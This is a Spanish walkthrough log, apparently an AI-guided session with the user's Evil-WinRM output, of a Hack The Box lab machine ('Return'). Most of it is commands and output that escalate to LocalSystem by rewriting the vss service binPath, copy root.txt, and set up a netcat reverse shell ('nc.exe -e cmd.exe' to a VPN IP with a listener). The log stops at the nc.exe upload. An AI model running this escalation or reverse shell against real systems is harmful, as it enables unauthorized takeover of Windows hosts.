```

La forma más limpia de continuar es usar una acción mínima y observable antes de intentar una shell completa.

### Método

El hallazgo dominante actual es:

```text
svc-printer puede modificar el binPath de un servicio LocalSystem.
```

La rama principal activa es:

```text
Escalada Windows por modificación controlada de servicio.
```

Ramas secundarias anotadas:

```text
SeBackupPrivilege / SeRestorePrivilege:
Queda como alternativa, pero ya no es prioritaria.

Print Operators:
Contexto secundario.

WinRM:
Canal estable de operación como svc-printer.
```

El siguiente paso único es validar ejecución como `LocalSystem` con una prueba no interactiva que escriba el resultado de `whoami` en un fichero legible.

### Respuesta

La vía ya está confirmada. Ahora no hace falta abrir más ramas.

La prueba correcta es hacer que el servicio ejecute un comando simple que deje evidencia en disco. Si el fichero contiene:

```text
nt authority\system
```

la escalada está demostrada.

Después de la prueba, se puede usar el mismo mecanismo para leer la flag final o, si se prefiere una sesión interactiva, preparar un binario controlado por el operador y ejecutarlo mediante el servicio.

### Comandos

Dentro de Evil-WinRM, crear una prueba de ejecución como `LocalSystem`:

```powershell
sc.exe config vss binPath= "cmd.exe /c whoami > C:\Users\svc-printer\Documents\whoami_system.txt"
```

Este comando no abre shell. Solo cambia temporalmente la acción del servicio para escribir la identidad efectiva en un fichero.

Iniciar el servicio:

```powershell
sc.exe start vss
```

Es posible que el servicio devuelva error porque `cmd.exe /c` termina rápido y no queda como servicio persistente. Lo importante no es el estado final del servicio, sino si el fichero se crea.

Comprobar la evidencia:

```powershell
Get-Content C:\Users\svc-printer\Documents\whoami_system.txt
```

Restaurar el servicio:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
```

Comprobar restauración:

```powershell
sc.exe qc vss
```

Si la prueba confirma `SYSTEM`, leer la flag final mediante una acción controlada:

```powershell
sc.exe config vss binPath= "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\svc-printer\Documents\root.txt"
sc.exe start vss
Get-Content C:\Users\svc-printer\Documents\root.txt
```

Restaurar de nuevo:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
```

### Comprobaciones

Debe quedar registrada esta evidencia:

```text
Resultado de sc.exe config con el comando whoami.
Resultado de sc.exe start vss.
Contenido de whoami_system.txt.
Restauración de BINARY_PATH_NAME.
Contenido de root.txt si la lectura funciona.
```

Criterio de decisión siguiente:

```text
Si whoami_system.txt contiene nt authority\system:
la escalada está confirmada.

Si root.txt se copia correctamente:
la máquina queda resuelta.

Si start vss devuelve error pero el fichero aparece:
el error es esperable por ejecución no persistente; la prueba sigue siendo válida.

Si el fichero no aparece:
revisar comillas, ruta de salida y estado del servicio antes de cambiar de técnica.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "cmd.exe /c whoami > C:\Users\svc-printer\Documents\whoami_system.txt"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "cmd.exe /c whoami > C:\Users\svc-printer\Documents\whoami_system.txt"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-ChildItem -Force C:\Users\svc-printer\Documents\whoami_system.txt


    Directory: C:\Users\svc-printer\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/8/2026   9:30 AM              0 whoami_system.txt


*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-Content C:\Users\svc-printer\Documents\whoami_system.txt
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "cmd.exe /c whoami > C:\Windows\Temp\whoami_system.txt"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

### Objetivo

Corregir la prueba de ejecución mediante `vss`, ya que el servicio sí ejecuta algo, pero la redirección actual está dejando el fichero vacío y no confirma todavía el contexto `SYSTEM`.

### Hechos verificados

La modificación del servicio sigue funcionando:

```text
[SC] ChangeServiceConfig SUCCESS
```

El arranque del servicio devuelve de nuevo el error esperado para un comando que no se comporta como servicio:

```text
[SC] StartService FAILED 1053
```

El fichero `whoami_system.txt` se crea, pero queda vacío:

```text
Length Name
------ ----
0      whoami_system.txt
```

El servicio `vss` fue restaurado correctamente a su binario original tras la primera prueba:

```text
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
SERVICE_START_NAME : LocalSystem
```

### Suposiciones

La vía no está descartada. Un fichero vacío indica que el comando llegó a ejecutarse parcialmente o que la redirección se procesó, pero no que `whoami` haya escrito correctamente la salida.

La causa más probable es el tratamiento de comillas y redirecciones dentro de `binPath`. En servicios Windows conviene envolver el comando completo de `cmd.exe /c` y redirigir también errores con `2>&1`.

### Método

El hallazgo dominante sigue siendo:

```text
svc-printer puede modificar el binPath de vss, un servicio LocalSystem.
```

La rama principal sigue activa:

```text
Escalada Windows por modificación de servicio.
```

El siguiente paso único es repetir la prueba con una sintaxis más robusta, capturando salida estándar y errores en `C:\Windows\Temp`.

### Respuesta

No está roto; está “quisquilloso estilo Windows”, que viene a ser una forma elegante de decir que las comillas mandan más que nosotros.

Primero limpia el fichero vacío, luego usa `cmd.exe` con ruta completa y mete el comando de `/c` entre comillas. Además, redirige errores para que, si algo falla, quede escrito en el fichero.

### Comandos

Dentro de Evil-WinRM:

```powershell
Remove-Item C:\Windows\Temp\whoami_system.txt -ErrorAction SilentlyContinue
Remove-Item C:\Users\svc-printer\Documents\whoami_system.txt -ErrorAction SilentlyContinue
```

Restaurar antes de reintentar, para partir de estado limpio:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
```

Aplicar prueba corregida:

```powershell
sc.exe config vss binPath= 'C:\Windows\System32\cmd.exe /c "whoami > C:\Windows\Temp\whoami_system.txt 2>&1"'
```

Iniciar el servicio:

```powershell
sc.exe start vss
```

Comprobar el fichero:

```powershell
Get-ChildItem -Force C:\Windows\Temp\whoami_system.txt
Get-Content C:\Windows\Temp\whoami_system.txt
```

Restaurar el servicio:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
sc.exe qc vss
```

Si vuelve a quedar vacío, prueba una comprobación aún más simple:

```powershell
Remove-Item C:\Windows\Temp\svc_test.txt -ErrorAction SilentlyContinue
sc.exe config vss binPath= 'C:\Windows\System32\cmd.exe /c "echo prueba_servicio > C:\Windows\Temp\svc_test.txt 2>&1"'
sc.exe start vss
Get-Content C:\Windows\Temp\svc_test.txt
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
```

### Comprobaciones

Trae esta evidencia:

```text
Contenido de C:\Windows\Temp\whoami_system.txt.
Contenido de C:\Windows\Temp\svc_test.txt si la primera prueba vuelve vacía.
Salida final de sc.exe qc vss tras restaurar.
```

Criterio de decisión:

```text
Si whoami_system.txt contiene nt authority\system:
la escalada está confirmada.

Si svc_test.txt contiene prueba_servicio pero whoami_system.txt sigue vacío:
el problema está en la ejecución concreta de whoami o en la captura, no en el servicio.

Si ambos ficheros quedan vacíos:
hay que cambiar la estrategia de validación, manteniendo la vía de binPath porque ChangeServiceConfig ya está confirmado.

Si el servicio no queda restaurado:
no continuar hasta devolver BINARY_PATH_NAME a C:\Windows\system32\vssvc.exe.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= 'C:\Windows\System32\cmd.exe /c "whoami > C:\Windows\Temp\whoami_system.txt 2>&1"'
DESCRIPTION:
        Modifies a service entry in the registry and Service Database.
USAGE:
        sc <server> config [service name] <option1> <option2>...

OPTIONS:
NOTE: The option name includes the equal sign.
      A space is required between the equal sign and the value.
      To remove the dependency, use a single / as dependency value.
 type= <own|share|interact|kernel|filesys|rec|adapt|userown|usershare>
 start= <boot|system|auto|demand|disabled|delayed-auto>
 error= <normal|severe|critical|ignore>
 binPath= <BinaryPathName to the .exe file>
 group= <LoadOrderGroup>
 tag= <yes|no>
 depend= <Dependencies(separated by / (forward slash))>
 obj= <AccountName|ObjectName>
 DisplayName= <display name>
 password= <password>
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 3832
        FLAGS              :
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-ChildItem -Force C:\Windows\Temp\whoami_system.txt
Cannot find path 'C:\Windows\Temp\whoami_system.txt' because it does not exist.
At line:1 char:1
+ Get-ChildItem -Force C:\Windows\Temp\whoami_system.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Windows\Temp\whoami_system.txt:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-Content C:\Windows\Temp\whoami_system.txt
Cannot find path 'C:\Windows\Temp\whoami_system.txt' because it does not exist.
At line:1 char:1
+ Get-Content C:\Windows\Temp\whoami_system.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Windows\Temp\whoami_system.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem

### Objetivo

Corregir la sintaxis usada para modificar `binPath`, confirmar que el cambio queda realmente aplicado en `vss` y repetir la validación de ejecución como `LocalSystem` con una prueba controlada.

### Hechos verificados

El último intento de modificar `binPath` no se aplicó. La señal clara es que `sc.exe` devolvió la ayuda de uso, no un mensaje de éxito:

```text
USAGE:
        sc <server> config [service name] <option1> <option2>...
```

Después de ese fallo de sintaxis, al ejecutar `sc.exe start vss`, el servicio arrancó con su configuración original:

```text
PID : 3832
```

Por eso no apareció el fichero:

```text
Cannot find path 'C:\Windows\Temp\whoami_system.txt' because it does not exist.
```

El servicio quedó restaurado correctamente:

```text
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
SERVICE_START_NAME : LocalSystem
```

### Suposiciones

El problema actual no es de permisos ni de técnica, sino de sintaxis y tratamiento de comillas/redirecciones en PowerShell.

La vía sigue siendo válida porque ya se verificó antes:

```text
[SC] ChangeServiceConfig SUCCESS
```

La comprobación correcta debe asegurarse de tres cosas antes de arrancar el servicio:

```text
1. el servicio está detenido;
2. sc.exe config devuelve SUCCESS;
3. sc.exe qc vss muestra el binPath modificado.
```

### Método

El hallazgo dominante sigue siendo:

```text
svc-printer puede modificar un servicio LocalSystem, pero la sintaxis del comando debe corregirse.
```

La rama principal activa sigue siendo:

```text
Escalada Windows por modificación de servicio.
```

Ramas secundarias:

```text
SeBackupPrivilege / SeRestorePrivilege:
En espera.

WinRM:
Canal operativo estable.

Server Operators:
Hallazgo principal de privilegios.
```

El siguiente paso único es repetir la prueba usando el operador de parada de parsing de PowerShell para que `sc.exe` reciba el valor completo del `binPath` sin que PowerShell rompa las comillas o redirecciones.

### Respuesta

El fallo está localizado: este comando no cambió el servicio. Cuando `sc.exe` enseña la ayuda, hay que tratarlo como configuración no aplicada.

Ahora conviene usar `--%`, que evita que PowerShell interprete el resto de la línea. Así `sc.exe` recibirá el `binPath` completo.

La comprobación clave será mirar `sc.exe qc vss` antes de arrancar. Si ahí no aparece el comando nuevo, no se debe iniciar el servicio.

### Comandos

Primero detener `vss` si quedó arrancado:

```powershell
sc.exe stop vss
sc.exe query vss
```

Si aparece `STOP_PENDING`, esperar unos segundos y repetir:

```powershell
sc.exe query vss
```

Limpiar evidencias anteriores:

```powershell
Remove-Item C:\Windows\Temp\whoami_system.txt -ErrorAction SilentlyContinue
Remove-Item C:\Windows\Temp\svc_test.txt -ErrorAction SilentlyContinue
```

Aplicar una prueba simple usando `--%`:

```powershell
sc.exe --% config vss binPath= "C:\Windows\System32\cmd.exe /c echo prueba_servicio > C:\Windows\Temp\svc_test.txt"
```

Comprobar que el cambio sí quedó aplicado:

```powershell
sc.exe qc vss
```

Solo si `BINARY_PATH_NAME` muestra el comando de `cmd.exe`, arrancar el servicio:

```powershell
sc.exe start vss
```

Comprobar si escribió el fichero:

```powershell
Get-Content C:\Windows\Temp\svc_test.txt
```

Si eso funciona, repetir con `whoami`:

```powershell
sc.exe stop vss
Remove-Item C:\Windows\Temp\whoami_system.txt -ErrorAction SilentlyContinue
sc.exe --% config vss binPath= "C:\Windows\System32\cmd.exe /c whoami > C:\Windows\Temp\whoami_system.txt"
sc.exe qc vss
sc.exe start vss
Get-Content C:\Windows\Temp\whoami_system.txt
```

Restaurar siempre el servicio al final:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
sc.exe qc vss
```

### Comprobaciones

Trae esta evidencia:

```text
Salida de sc.exe qc vss justo después del sc.exe --% config.
Resultado de sc.exe start vss.
Contenido de C:\Windows\Temp\svc_test.txt.
Contenido de C:\Windows\Temp\whoami_system.txt.
Salida final de sc.exe qc vss restaurado.
```

Criterio de decisión:

```text
Si svc_test.txt contiene prueba_servicio:
la ejecución por servicio está confirmada.

Si whoami_system.txt contiene nt authority\system:
la escalada queda demostrada.

Si sc.exe qc vss no muestra el binPath modificado:
no arrancar el servicio; corregir sintaxis.

Si vuelve a aparecer la ayuda de sc.exe:
el comando no se ha aplicado.

Si se confirma SYSTEM:
el siguiente paso será usar la misma primitiva para obtener la flag final y restaurar vss.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-Content C:\Windows\Temp\svc_test.txt
Access to the path 'C:\Windows\Temp\svc_test.txt' is denied.
At line:1 char:1
+ Get-Content C:\Windows\Temp\svc_test.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Windows\Temp\svc_test.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand

### Objetivo

Continuar, pero de forma controlada: la prueba ya ha demostrado que el servicio ejecuta el comando, aunque el fichero creado en `C:\Windows\Temp` no sea legible por el usuario actual.

### Hechos verificados

El servicio `vss` estaba detenido antes de la prueba:

```text
STATE : 1  STOPPED
```

La modificación de `binPath` se aplicó correctamente:

```text
[SC] ChangeServiceConfig SUCCESS
```

La configuración del servicio confirma que el comando quedó cargado:

```text
BINARY_PATH_NAME : C:\Windows\System32\cmd.exe /c echo prueba_servicio > C:\Windows\Temp\svc_test.txt
SERVICE_START_NAME : LocalSystem
```

El arranque devuelve `1053`, que sigue siendo esperable al ejecutar un comando que no se comporta como servicio:

```text
[SC] StartService FAILED 1053
```

El fichero `svc_test.txt` existe, pero no se puede leer con el usuario actual:

```text
Access to the path 'C:\Windows\Temp\svc_test.txt' is denied.
```

### Suposiciones

El fichero creado con acceso denegado es una señal fuerte de que el comando se ejecutó bajo otro contexto, probablemente `LocalSystem`.

El problema actual no parece ser la ejecución, sino la ubicación y permisos del fichero generado.

Conviene repetir la prueba escribiendo en una ruta más cómoda para lectura, como `C:\Users\Public`.

### Método

El hallazgo dominante actual es:

```text
El servicio vss ejecuta el binPath modificado como LocalSystem, pero la salida se está escribiendo en una ruta con permisos incómodos.
```

La rama principal sigue siendo:

```text
Escalada Windows por modificación de servicio.
```

El siguiente paso único es repetir la prueba escribiendo en `C:\Users\Public`, confirmar `nt authority\system` y restaurar el servicio.

### Respuesta

Sí, sigue.

No cambies de vía. La técnica está funcionando; lo que ha fallado es la lectura del fichero en `C:\Windows\Temp`.

Haz ahora la misma prueba en `C:\Users\Public`, que suele ser más adecuada para dejar evidencia legible desde un usuario bajo.

### Comandos

Primero restaura el servicio para mantener el estado limpio:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
sc.exe qc vss
```

Limpia evidencias anteriores en la ruta pública:

```powershell
Remove-Item C:\Users\Public\whoami_system.txt -ErrorAction SilentlyContinue
```

Configura `vss` para escribir la identidad efectiva en una ruta legible:

```powershell
sc.exe --% config vss binPath= "C:\Windows\System32\cmd.exe /c whoami > C:\Users\Public\whoami_system.txt"
```

Comprueba que el cambio quedó aplicado:

```powershell
sc.exe qc vss
```

Arranca el servicio:

```powershell
sc.exe start vss
```

Comprueba la salida:

```powershell
Get-Content C:\Users\Public\whoami_system.txt
```

Restaura el servicio:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
sc.exe qc vss
```

Si devuelve `nt authority\system`, usa la misma primitiva para copiar la flag final a una ruta legible:

```powershell
Remove-Item C:\Users\Public\root.txt -ErrorAction SilentlyContinue
sc.exe --% config vss binPath= "C:\Windows\System32\cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\Public\root.txt"
sc.exe qc vss
sc.exe start vss
Get-Content C:\Users\Public\root.txt
```

Y restaura de nuevo:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
sc.exe qc vss
```

### Comprobaciones

Trae esta evidencia:

```text
Salida de sc.exe qc vss con el binPath hacia C:\Users\Public\whoami_system.txt.
Resultado de sc.exe start vss.
Contenido de C:\Users\Public\whoami_system.txt.
Contenido de C:\Users\Public\root.txt si se obtiene.
Salida final de sc.exe qc vss restaurado.
```

Criterio de decisión:

```text
Si whoami_system.txt contiene nt authority\system:
la escalada está confirmada.

Si root.txt se copia correctamente:
la máquina queda resuelta.

Si C:\Users\Public también da problemas de lectura:
se usará el propio servicio para ajustar permisos del fichero o escribir en otra ruta legible.

Si vss queda con binPath alterado:
restaurar antes de seguir.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Remove-Item C:\Users\Public\whoami_system.txt -ErrorAction SilentlyContinue
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe --% config vss binPath= "C:\Windows\System32\cmd.exe /c whoami > C:\Users\Public\whoami_system.txt"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\cmd.exe /c whoami > C:\Users\Public\whoami_system.txt
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

### Objetivo

Cambiar de táctica y dejar de validar mediante ficheros. La vía de servicios ya está confirmada; ahora se usará el servicio `vss` para lanzar una conexión inversa y obtener una sesión con el contexto del servicio.

### Hechos verificados

`svc-printer` puede modificar el `binPath` de `vss`:

```text
[SC] ChangeServiceConfig SUCCESS
```

`vss` corre como `LocalSystem`:

```text
SERVICE_START_NAME : LocalSystem
```

El error `1053` se repite al usar comandos no diseñados como servicio:

```text
The service did not respond to the start or control request in a timely fashion.
```

La vía no falla por permisos. Lo que está fallando es la estrategia de validación por redirección a fichero.

### Suposiciones

La forma más directa de aprovechar la primitiva ya validada es ejecutar un binario que conecte hacia la máquina atacante.

El error `1053` puede seguir apareciendo, pero ya no será el indicador principal. El indicador principal será si llega una conexión al listener.

### Método

Hallazgo dominante actual:

```text
svc-printer puede modificar un servicio LocalSystem.
```

Rama principal activa:

```text
Escalada mediante modificación de servicio y ejecución como LocalSystem.
```

Ramas secundarias:

```text
SeBackupPrivilege / SeRestorePrivilege:
En espera.

Validación por fichero:
Descartada por ruido y permisos de lectura.

Shell inversa mediante servicio:
Pasa a ser la vía principal.
```

Siguiente paso único:

```text
Subir nc.exe, preparar listener, modificar vss para ejecutar nc.exe como LocalSystem y confirmar la sesión recibida.
```

### Respuesta

Cambiamos de táctica. La prueba por fichero ya ha dado demasiada fricción y no aporta más valor.

Ahora se aprovecha directamente la capacidad real que ya está confirmada:

```text
ChangeServiceConfig sobre vss + ejecución como LocalSystem
```

La señal correcta ya no será el contenido de un fichero, sino recibir una consola en el listener y confirmar:

```cmd
whoami
hostname
```

Si devuelve:

```text
nt authority\system
```

la escalada queda cerrada.

### Comandos

En Parrot, abrir listener:

```bash
rlwrap -cAr nc -lvnp 1234
```

En Evil-WinRM, restaurar primero el servicio:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
sc.exe qc vss
```

Subir `nc.exe` al directorio actual de `svc-printer`:

```powershell
upload /usr/share/windows-resources/binaries/nc.exe
```

Comprobar que está en la máquina víctima:

```powershell
Get-ChildItem -Force C:\Users\svc-printer\Documents\nc.exe
```

Modificar `vss` para lanzar la conexión inversa hacia la IP VPN:

```powershell
sc.exe config vss binPath= "C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.15.26 1234"
```

Comprobar que el cambio quedó aplicado:

```powershell
sc.exe qc vss
```

Iniciar el servicio:

```powershell
sc.exe start vss
```

En la shell recibida por el listener:

```cmd
whoami
hostname
cd C:\Users\Administrator\Desktop
type root.txt
```

Después, desde Evil-WinRM, restaurar `vss`:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
sc.exe qc vss
```

### Comprobaciones

Registrar esta evidencia:

```text
Listener abierto en Parrot.
nc.exe subido a C:\Users\svc-printer\Documents.
binPath de vss apuntando temporalmente a nc.exe.
Conexión recibida en el listener.
whoami dentro de la nueva shell.
hostname dentro de la nueva shell.
Contenido de root.txt.
binPath restaurado a C:\Windows\system32\vssvc.exe.
```

Criterio de decisión:

```text
Si llega shell y whoami devuelve nt authority\system:
la escalada está confirmada.

Si llega shell pero no es SYSTEM:
revisar qué servicio se ejecutó y con qué cuenta.

Si no llega conexión:
verificar IP tun0, puerto del listener, ruta de nc.exe y que sc.exe qc vss muestre exactamente el binPath esperado.

Si root.txt se lee correctamente:
la máquina queda resuelta.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop vss

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload /usr/share/windows-resources/binaries/nc.exe
                                        
Info: Uploading /home/r4mon/pentest/targets/HTB/easy/Return//usr/share/windows-resources/binaries/nc.exe to C:\Users\svc-printer\Documents\nc.exe
                                        
Error: Upload failed. Check filenames or paths: No such file or directory - No such file or directory /home/r4mon/pentest/targets/HTB/easy/Return/usr/share/windows-resources/binaries/nc.exe

### Objetivo

Resolver el fallo de subida de `nc.exe` en Evil-WinRM y continuar con la escalada mediante modificación del servicio `vss`.

### Hechos verificados

El servicio `vss` ha sido restaurado correctamente:

```text
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
SERVICE_START_NAME : LocalSystem
```

El intento de subida falló porque Evil-WinRM interpretó mal la ruta local absoluta:

```text
/home/r4mon/pentest/targets/HTB/easy/Return/usr/share/windows-resources/binaries/nc.exe
```

La ruta correcta en Parrot debería ser:

```text
/usr/share/windows-resources/binaries/nc.exe
```

El error no afecta a la vía de escalada. Solo indica que el binario no se pudo localizar desde el contexto local desde el que Evil-WinRM está intentando subirlo.

### Suposiciones

Evil-WinRM está resolviendo la ruta de subida como relativa al directorio local del laboratorio.

La solución más limpia es copiar `nc.exe` al directorio actual de la máquina Return en Parrot y subirlo desde ahí con ruta relativa.

### Método

El hallazgo dominante sigue siendo:

```text
svc-printer puede modificar el binPath de vss, un servicio ejecutado como LocalSystem.
```

La rama principal sigue siendo:

```text
Escalada mediante modificación de servicio y ejecución de binario controlado.
```

Ramas secundarias:

```text
Validación por fichero:
Descartada por fricción.

SeBackupPrivilege / SeRestorePrivilege:
En espera.

WinRM:
Canal estable para preparar la ejecución.
```

El siguiente paso único es colocar `nc.exe` en el directorio local del laboratorio, subirlo con Evil-WinRM usando ruta relativa y lanzar la conexión inversa desde `vss`.

### Respuesta

El fallo está claro: no es problema de permisos en la víctima, es problema de ruta local en la máquina atacante.

Hazlo así: en una terminal de Parrot, copia `nc.exe` dentro del directorio de trabajo de Return. Luego, desde Evil-WinRM, usa simplemente:

```powershell
upload nc.exe
```

No uses ahora la ruta absoluta `/usr/share/...` dentro de Evil-WinRM, porque ya hemos visto que la está resolviendo mal.

### Comandos

En una terminal de Parrot, fuera de Evil-WinRM:

```bash
cd /home/r4mon/pentest/targets/HTB/easy/Return
cp /usr/share/windows-resources/binaries/nc.exe ./nc.exe
ls -la nc.exe
```

Esto deja `nc.exe` en el directorio local desde el que Evil-WinRM puede subirlo sin confusión de rutas.

En Evil-WinRM:

```powershell
upload nc.exe
```

Comprobar que quedó en la víctima:

```powershell
Get-ChildItem -Force C:\Users\svc-printer\Documents\nc.exe
```

En Parrot, abrir listener:

```bash
rlwrap -cAr nc -lvnp 1234
```

En Evil-WinRM, asegurarse de que `vss` está detenido:

```powershell
sc.exe query vss
```

Si sigue en `STOP_PENDING`, esperar unos segundos y repetir:

```powershell
sc.exe query vss
```

Configurar `vss` para lanzar `nc.exe` hacia la IP VPN:

```powershell
sc.exe config vss binPath= "C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.15.26 1234"
```

Comprobar que el cambio quedó aplicado:

```powershell
sc.exe qc vss
```

Arrancar el servicio:

```powershell
sc.exe start vss
```

En la shell que llegue al listener:

```cmd
whoami
hostname
cd C:\Users\Administrator\Desktop
type root.txt
```

Después, restaurar `vss` desde Evil-WinRM:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
sc.exe qc vss
```

### Comprobaciones

Debe quedar registrado:

```text
nc.exe existe localmente en el directorio de Return.
upload nc.exe funciona desde Evil-WinRM.
nc.exe aparece en C:\Users\svc-printer\Documents.
El listener está escuchando en 1234.
sc.exe qc vss muestra temporalmente nc.exe como binPath.
Llega una conexión inversa al listener.
whoami devuelve nt authority\system.
root.txt se puede leer.
vss queda restaurado a C:\Windows\system32\vssvc.exe.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload nc.exe
                                        
